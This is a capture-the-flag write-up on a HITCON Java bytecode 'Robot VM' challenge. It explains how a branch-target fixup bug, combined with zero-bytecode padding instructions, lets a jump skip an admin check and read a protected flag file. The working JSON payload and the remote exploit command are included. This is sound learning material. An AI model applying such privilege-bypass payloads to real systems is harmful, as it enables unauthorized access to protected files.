# HITCON Robot VM Writeup

## TL;DR

The challenge is not a normal interpreted VM. The server takes your protobuf `Instruction` list, compiles it into **real JVM bytecode** with ASM, loads it as `MyRobot extends Robot`, and then executes `MyRobot.chat()`.

The privileged opcode is `machineid`, which reads `/home/challenge/flag`, but only if `this.admin` is true.

The bug is in the VM compiler's branch target fixup. It mixes:

- VM instruction indices
- emitted JVM bytecode node indices

That lets a jump land in the **middle** of `machineid` instead of at its start. By padding with instructions that count as VM instructions but emit **zero JVM nodes**, we can skip the `admin` check and jump directly into the file-read part of `machineid`.

Final flag:

```text
FLAG{dO_y0U_L1k3_thi5_Java_6y4ec0d3_cha113nge?}
```

---

## 1. Challenge Workflow

This is the full runtime flow of the challenge.

### Network / service flow

```text
client
  -> gRPC robot.Robot/Send
  -> server spawns boxed worker:
       java -jar /home/challenge/robot.jar --box
  -> protobuf requests are forwarded into boxed mode
  -> boxed mode updates current robot or calls chat()
  -> response is returned to client
```

### Custom robot update flow

```text
CommandRequest.code
  -> parse protobuf Code
  -> Code.instructions = repeated Instruction
  -> Code.token = string
  -> pass Code into ctf.hitcon.robot.aP
  -> aP compiles instructions with ASM
  -> generates class MyRobot extends Robot
  -> defineClass("MyRobot", bytecode)
  -> instantiate MyRobot(token)
  -> if successful, replace current robot
```

### Later message flow

```text
CommandRequest.message
  -> currentRobot.chat(message)
  -> if we uploaded a custom robot, this is MyRobot.chat()
```

So the whole challenge reduces to:

1. upload a malicious `Code`
2. get the server to compile a dangerous `MyRobot.chat()`
3. send a second message to execute it

---

## 2. What the VM Really Is

The most important observation is:

```text
This is compilation, not interpretation.
```

The server does **not** execute a custom bytecode interpreter loop. Instead:

```text
protobuf Instruction
  -> ASM tree nodes
  -> JVM bytecode
  -> defined class MyRobot
  -> executed by the JVM directly
```

This matters because any bug in:

- branch resolution
- stack typing
- helper macro expansion
- label placement

becomes a real code generation bug, not just a harmless VM quirk.

---

## 3. The Security Check

`MyRobot` extends `Robot`, and the generated constructors are fixed:

- `MyRobot()`
- `MyRobot(String token)`

The second constructor calls `Robot(String token)`.

Inside `Robot(String token)`, the server:

1. reads the first 32 bytes of `/home/challenge/flag`
2. computes SHA-256
3. hex-encodes the digest
4. compares it with the user-supplied token

If they match:

```text
admin = true
```

Otherwise:

```text
admin = false
```

At first this suggests we need to somehow recover the token. But the hint said the bug is in the custom VM, so the better question is:

```text
Can we bypass the admin check inside generated code?
```

---

## 4. The Privileged Opcode: `machineid`

Among the helper opcodes, `machineid` is the important one.

It expands to JVM bytecode roughly like this:

```java
if (this.admin) {
    File f = new File("/home/challenge/flag");
    FileInputStream fis = new FileInputStream(f);
    BufferedInputStream bis = new BufferedInputStream(fis);
    byte[] data = new byte[100];
    bis.read(data, 0, 100);
    bis.close();
    return data;
} else {
    return null;
}
```

Later, another helper `b2s` can convert that `byte[]` into a Java `String`.

So the intended privileged path is:

```text
gain admin
  -> call machineid
  -> get flag bytes
  -> b2s
  -> return STRING
```

If we can enter `machineid` **after** the `if (this.admin)` check, the challenge is solved.

---

## 5. How the Compiler Tracks Instructions

The custom compiler is in `ctf.hitcon.robot.aP`.

It processes the uploaded VM program in two stages:

### Stage 1: emit bytecode skeleton

For each top-level VM instruction:

- remember the current VM instruction index
- remember the current number of emitted JVM nodes
- emit ASM nodes for this instruction

The internal fields are effectively:

- `f` = current VM instruction index
- `g` = current emitted JVM node count
- `e[vm_index] = g_at_start_of_that_instruction`

This map `e` is supposed to tell the compiler where each VM instruction starts in the emitted bytecode stream.

### Stage 2: resolve jumps

For `goto`, `if`, `ificmp`, `ifnull`, `tableswitch`, `lookupswitch`, the compiler later resolves the target label.

This second stage is where the bug is.

---

## 6. The Bug

The branch fixup logic does not jump to:

```text
start of target VM instruction
```

Instead, it computes a destination using:

- the VM target instruction index
- plus the emitted-node offset stored in `e[target]`

Conceptually, it does something like:

```text
bad_target = target_vm_index + emitted_offset_of_that_instruction
```

This is wrong because those are different coordinate systems:

- VM instruction index counts protobuf instructions
- emitted offset counts generated JVM nodes

If every VM instruction emitted exactly one JVM node, the bug might not be visible.

But helper opcodes like `machineid`, `readfile`, `writefile`, `time` emit **many** JVM nodes.

So a branch to `machineid` does not necessarily land at the start of `machineid`. It can land **inside** it.

That is the core vulnerability.

---

## 7. Why the Bug Is Exploitable

The broken branch target alone is not quite enough. We also need a way to fine-tune where the jump lands.

That is where malformed instructions help.

Some opcodes accept enums such as a type field. If we provide an invalid enum number like:

```json
{"add":{"type":99}}
```

the protobuf parser accepts it, and the compiler processes it as a top-level VM instruction, but the code generator falls through without emitting any real JVM node.

So that instruction:

- increases the VM instruction index
- emits zero bytecode nodes

This gives us a very useful primitive:

```text
shift VM instruction numbering without shifting bytecode layout
```

Once we have that, we can steer the broken jump target to a precise location inside a helper macro.

---

## 8. Exploit Goal

We want execution to enter `machineid` here:

```text
new File("/home/challenge/flag")
```

and **not** here:

```text
aload_0
getfield Robot.admin
ifeq fail
```

So the plan becomes:

1. place a `goto`
2. pad with several VM instructions that emit zero JVM nodes
3. place `machineid`
4. let the broken target fixup land in the middle of `machineid`
5. convert returned bytes to string with `b2s`
6. `return STRING`

---

## 9. Exploit Development

### First observation

A plain `machineid -> b2s -> return` works structurally, but with no admin token the second request crashes because `machineid` returns `null`.

That confirmed the helper layout and the privilege boundary.

### First jump attempt

A simple branch to `machineid` landed at its start, so the `admin` check still ran.

### Second jump attempt

Using two zero-byte instructions moved the target, but not enough. The generated class failed during ASM frame computation with errors like:

```text
java.lang.NegativeArraySizeException
at org.objectweb.asm.Frame.merge
```

That is exactly what you would expect if control flow lands on an internal instruction that assumes the wrong stack state, for example the `ifeq` inside `machineid`.

### Final working payload

The successful payload was:

```json
[
  { "goto": { "offset": -4 } },
  { "add": { "type": 99 } },
  { "add": { "type": 99 } },
  { "add": { "type": 99 } },
  { "machineid": {} },
  { "b2s": {} },
  { "return": { "type": "STRING" } }
]
```

Saved here:

- [sample_exploit3.json](/home/ngobao259/robot/sample_exploit3.json)

---

## 10. Why the Final Payload Works

Let us number the top-level VM instructions:

```text
0: goto offset -4
1: invalid add
2: invalid add
3: invalid add
4: machineid
5: b2s
6: return STRING
```

Now look at what happens.

### VM instruction view

Instruction `0` says:

```text
jump to instruction 4
```

because:

```text
0 - (-4) = 4
```

### Emitted bytecode view

Instructions `1`, `2`, and `3` emit **zero JVM nodes**.

So when `machineid` begins, the emitted bytecode position is much earlier than the compiler assumes if it mixes:

- target VM index `4`
- emitted node offset for instruction `4`

The bad formula makes the final target land a few emitted nodes **into** `machineid`.

That landing point is after:

```text
aload_0
getfield admin
ifeq fail
```

and before:

```text
new File("/home/challenge/flag")
```

This is the exact condition we need.

After that:

1. `machineid` reads the flag bytes
2. `b2s` turns `byte[]` into `String`
3. `return STRING` sends it back

So the exploit is not "setting admin". It is:

```text
enter machineid in the middle
```

---

## 11. Local Validation

I validated the exploit locally using:

- [vm_flow.py](/home/ngobao259/robot/vm_flow.py)
- [debug_box.py](/home/ngobao259/robot/debug_box.py)

Local run result:

```text
response 1: Update Successfully
```

and then:

```text
java.io.FileNotFoundException: /home/challenge/flag
```

That local failure is actually strong evidence that the exploit is correct.

Why?

Because the local environment does not have the real challenge file at `/home/challenge/flag`, but the only way to reach that `FileInputStream` path is to bypass the `admin` gate inside `machineid`.

So the local crash proves:

```text
we already skipped the admin check and reached the privileged file open
```

---

## 12. Remote Solve

The remote exploit command was:

```bash
python3 vm_flow.py \
  --mode grpc \
  --target chall.pwnable.tw:10311 \
  --jar robot.jar \
  --instructions sample_exploit3.json \
  --chat x
```

The server returned:

```text
[response 1] Update Successfully
[response 2] FLAG{dO_y0U_L1k3_thi5_Java_6y4ec0d3_cha113nge?}
```

---

## 13. Complete Exploit Workflow

If you want the shortest practical explanation of the solve, it is this:

### Step 1

Understand that uploaded VM code is compiled into a real Java class:

```text
Instruction list -> ASM -> MyRobot.chat()
```

### Step 2

Find the privileged helper:

```text
machineid
```

which reads `/home/challenge/flag` but checks `this.admin` first.

### Step 3

Reverse the branch fixup in `aP` and notice it mixes:

- logical instruction indices
- physical emitted node offsets

### Step 4

Find instructions that count as VM instructions but emit zero bytecode nodes:

```json
{"add":{"type":99}}
```

### Step 5

Use those zero-byte instructions as padding so a broken `goto` lands inside `machineid`, after the `admin` check.

### Step 6

Convert the returned `byte[]` to string with `b2s`, then return it.

### Step 7

Send a second chat message to execute the newly uploaded robot.

That is the entire exploit path.

---

## 14. Why This Bug Class Matters

This challenge is a nice example of a real compiler design failure:

- helper macros emit variable-length code
- branch fixup assumes a broken mapping
- malformed instructions affect control-flow accounting
- security checks are embedded inside compiler-generated helpers

This is not arbitrary opcode injection. It is subtler:

```text
bad control-flow mapping + variable-size macro expansion + zero-byte padding
```

That is exactly the kind of bug that can appear in:

- custom assemblers
- DSL compilers
- bytecode builders
- JIT frontends
- verification shims around "safe" VMs

---

## 15. Files Used

- [vm_flow.py](/home/ngobao259/robot/vm_flow.py)
- [debug_box.py](/home/ngobao259/robot/debug_box.py)
- [sample_exploit3.json](/home/ngobao259/robot/sample_exploit3.json)
- [sample_machineid.json](/home/ngobao259/robot/sample_machineid.json)
- [sample_readfile.json](/home/ngobao259/robot/sample_readfile.json)
- [sample_writefile.json](/home/ngobao259/robot/sample_writefile.json)

---

## 16. Flag

```text
FLAG{dO_y0U_L1k3_thi5_Java_6y4ec0d3_cha113nge?}
```
